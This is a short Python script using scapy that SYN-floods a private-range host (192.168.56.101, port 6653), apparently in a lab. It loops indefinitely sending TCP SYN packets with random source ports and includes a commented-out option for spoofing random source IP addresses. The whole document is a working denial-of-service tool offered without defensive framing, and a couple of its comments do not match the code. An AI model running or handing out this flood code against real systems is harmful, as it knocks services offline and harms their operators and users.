from scapy.all import *
import random

# Target IP address
target_ip = "192.168.56.101"
# Target port (e.g., 80 for web server)
target_port = 6653

# Source port range for randomization
source_port_min = 1024
source_port_max = 65535

print(f"Starting SYN flood on {target_ip}:{target_port}. Press Ctrl+C to stop.")

try:
    while True:
        # Generate a random source port
        source_port = random.randint(source_port_min, source_port_max)
        # Craft the IP packet with a random source IP (optional, for spoofing)
        # ip_packet = IP(dst=target_ip, src=str(random.randint(1,254))+"."+str(random.randint(1,254))+"."+str(random.randint(1,254))+"."+str(random.randint(1,254)))
        ip_packet = IP(dst=target_ip)
        
        # Craft the TCP SYN packet with the 'S' flag set
        tcp_packet = TCP(sport=source_port, dport=target_port, flags="S")
        
        # Combine the layers and send the packet. loop=0 sends indefinitely.
        send(ip_packet/tcp_packet, verbose=0)
        
except KeyboardInterrupt:
    print("\nSYN flood stopped.")

